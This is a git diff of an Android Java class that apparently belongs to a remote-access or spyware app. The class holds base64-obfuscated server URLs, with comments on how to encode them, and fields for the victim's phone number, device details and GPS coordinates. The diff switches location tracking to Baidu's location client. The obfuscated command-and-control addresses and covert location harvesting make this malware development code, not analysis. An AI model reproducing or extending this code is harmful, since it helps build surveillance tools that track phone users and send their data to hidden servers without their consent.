@@ -5,7 +5,12 @@ import android.location.Location;
 import android.location.LocationManager;
 import android.preference.PreferenceManager;
 
+import com.baidu.location.BDLocation;
+import com.baidu.location.BDLocationListener;
+import com.baidu.location.LocationClient;
+
 import u.can.i.up.expert.MyService;
+import u.can.i.up.expert.framework.MyLocationListener;
 
 /**
  * Created by lczgywzyy on 2015/1/13.
@@ -23,7 +28,7 @@ public class DataSet {
 //    public String backupURL = "aHR0cDovLzIyMi4xMjguMTMuNzA6MTM4ODA=";
     public String encodedURL = "aHR0cDovLzE5Mi4xNjguMi4xMzg="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://192.168.2.138)
     public String backupURL = "aHR0cDovLzE5Mi4xNjguMi4xMzg=";
-//    public String encodedURL = "aHR0cDovLzE5Mi4xNjguMi41OQ=="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://192.168.2.59)
+    //    public String encodedURL = "aHR0cDovLzE5Mi4xNjguMi41OQ=="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://192.168.2.59)
 //    public String backupURL = "aHR0cDovLzE5Mi4xNjguMi41OQ==";
 //    public String encodedURL = "aHR0cDovLzEwLjEwOS4yMzUuMTM4"; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://10.109.235.138)
 //    public String backupURL = "aHR0cDovLzEwLjEwOS4yMzUuMTM4";
@@ -50,7 +55,8 @@ public class DataSet {
     public MyService myService;
     //********************************************************************************************************************************************************
     public int random;
-    public Location location;
+//    public Location location;
+    public BDLocation location = null;
     public String phonenumber;
     public String device;
     public String sdk;
@@ -59,5 +65,8 @@ public class DataSet {
     public PreferenceManager pm;
     public Double latitude;
     public Double longitude;
-    public LocationManager locManager;
+    //    public LocationManager locManager;
+    public LocationClient locManager = null;
+
+    public final BDLocationListener locationListener = new MyLocationListener();
 }
